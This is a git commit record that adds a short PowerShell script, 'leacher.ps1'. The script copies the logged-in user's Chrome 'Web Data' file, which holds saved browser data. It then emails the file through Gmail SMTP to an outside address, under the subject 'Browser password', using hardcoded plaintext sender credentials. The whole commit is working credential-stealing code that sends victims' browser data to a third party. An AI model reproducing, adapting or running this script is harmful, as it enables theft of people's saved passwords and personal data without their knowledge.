77b6285fbe01d25e098056b980ad77292e09bb8a
sabin15 <sabinshrestha15@outlook.com>
2017-12-11 23:00:27 +0545

    Create leacher.ps1

---
+++ leacher.ps1
@@ -0,0 +1,16 @@
+
+$username=$env:UserName
+$data="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Default\Web Data"
+copy-item -path $data -destination D:/
+$From = "demosabin5010@gmail.com"
+$Pass = "demoaccount"
+$To = "sabinshrestha15@gmail.com"
+$Attachment = "D:\Web Data"
+$Subject = "Browser password"
+$Body = "pass attached"
+$SMTPServer = "smtp.gmail.com"
+$SMTPPort = "587"
+$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
+Send-MailMessage -From $From -to $To -Subject $Subject `
+-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
+-Credential $credentials -Attachments $Attachment
